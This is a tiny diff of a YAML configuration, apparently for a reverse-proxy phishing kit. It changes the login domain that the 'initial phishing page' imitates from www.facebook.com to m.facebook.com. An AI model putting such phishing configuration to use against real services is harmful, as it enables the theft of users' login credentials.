@@ -74,5 +74,5 @@ js_inject:
 
 login:
   # Setting the login domain and path for the initial phishing page.
-  domain: 'www.facebook.com'
+  domain: 'm.facebook.com'
   path: '/login.php'
